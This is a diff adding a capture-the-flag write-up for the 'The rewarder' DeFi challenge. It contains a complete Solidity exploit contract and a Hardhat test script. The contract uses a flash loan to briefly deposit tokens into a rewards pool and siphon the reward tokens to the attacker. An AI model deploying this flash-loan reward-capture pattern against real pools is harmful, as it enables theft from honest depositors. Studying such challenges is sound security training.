@@ -1,0 +1,79 @@
+# Challenge #5 - The rewarder
+ There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
+
+ Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
+
+ You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
+
+ Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans? 
+
+## Exploit 
+In this challenge we can use the flashloan, to mint the attacker free rewardTokens by modifying 
+the transaction timestamp and calling the ``distributeRewards()`` before returning the flashloan. 
+Therefore, we can mint as an attacker free reward tokens.  
+ 
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+interface ILendingPool {
+	function flashLoan(uint256 amount) external;
+}
+
+interface IRewardsPool {
+	function deposit(uint256 amountToDeposit) external;
+	function withdraw(uint256 amountToWithdraw) external;
+}
+
+interface IDVT {
+	function transfer(address to, uint256 amount) external returns (bool);
+	function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IRewardToken {
+	function transfer(address to, uint256 amount) external returns (bool);
+	function balanceOf(address account) external view returns (uint256);
+}
+
+contract Exploit_TheReward {
+
+	address attacker;
+	ILendingPool lendingPool;
+	IRewardsPool rewardsPool;	
+	IRewardToken rewardToken;
+	IDVT dvt;
+
+	function exec(address _lendingPool, address _rewardsPool, address _dvt, address _rt) external {
+		lendingPool = ILendingPool(_lendingPool);	
+		rewardsPool = IRewardsPool(_rewardsPool);
+		rewardToken = IRewardToken(_rt);
+		dvt = IDVT(_dvt);
+		attacker = msg.sender;
+		lendingPool.flashLoan(1000000 ether);
+	}
+	
+	function receiveFlashLoan(uint256 amount) external {
+		dvt.approve(address(rewardsPool), amount);
+		rewardsPool.deposit(amount);
+		rewardsPool.withdraw(amount);
+		dvt.transfer(address(lendingPool), amount);
+		rewardToken.transfer(attacker, rewardToken.balanceOf(address(this))); 
+	}
+}
+
+```
+Execution: 
+```js
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+		await this.exploit.exec(
+			this.flashLoanPool.address, 
+			this.rewarderPool.address,
+			this.liquidityToken.address,
+			this.rewardToken.address
+		);
+    });
+```
